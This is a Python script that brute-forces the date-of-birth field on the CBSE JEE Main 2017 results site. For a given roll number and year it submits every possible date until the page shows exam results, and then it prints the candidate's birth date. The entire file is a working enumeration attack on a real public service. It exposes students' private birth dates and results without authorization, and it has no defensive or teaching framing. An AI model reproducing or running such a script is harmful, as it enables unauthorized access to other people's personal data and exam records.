import sys
import requests
from bs4 import BeautifulSoup as BS

h = {
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'en-GB,en;q=0.8,en-US;q=0.6,hi;q=0.4',
		'Cache-Control': 'max-age=0',
		'Connection': 'keep-alive',
		'Content-Length': '43',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Host': 'cbseresults.nic.in',
		'Origin': 'http://cbseresults.nic.in',
		'Referer': 'http://cbseresults.nic.in/jee_main_zxc/Jee_cbse_2017.htm'
	}

url="http://cbseresults.nic.in/jee_main_zxc/jee_cbse_2017.asp"

def connect(url, m):
	t = requests.post(url, data = m, headers = h)
	soup = BS(t.text, 'html.parser')
	if "Mathematics" in soup.get_text():
		print("DOB : " + m["dob"])
		sys.exit()

def controller():
	m = {}
	roll = str(input("Roll No: "))
	year = str(input("Year: "))
	for i in range(1,13):
		for j in range(1,32):
			m["regno"] = roll
			m["dob"] = str(j).zfill(2) + "/" + str(i).zfill(2) + "/" + year
			m["B2"] = "Submit"
			print ("Checking for " + m["dob"])
			connect(url ,m)

	print (":( DOB not found!")
	print ("?! Try Another Year")

controller()
